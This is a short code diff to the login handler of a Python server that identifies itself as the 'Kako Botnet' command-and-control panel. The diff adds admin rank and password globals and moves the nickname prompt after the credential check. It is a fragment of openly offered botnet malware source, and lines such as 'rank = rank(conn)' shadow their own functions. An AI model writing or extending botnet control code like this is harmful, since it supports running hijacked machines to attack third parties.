@@ -36,6 +36,8 @@ def botDisconnect():
 	
 def clientThread(conn):
 	try:
+		global rankAdmin
+		global pwordAdmin
 		global rankGuest
 		global pwordGuest
 
@@ -72,8 +74,8 @@ def clientThread(conn):
 		while True:
 			rank = rank(conn)
 			password = password(conn)
-			nickname = nickname(conn)
 			if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
+				nickname = nickname(conn)
 				conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 				conn.sendall("[?] Please use the custom client.py made by Feitan\r\n")
 				conn.sendall("[?] Or else it made not work as its been untested with other clients\r\n")
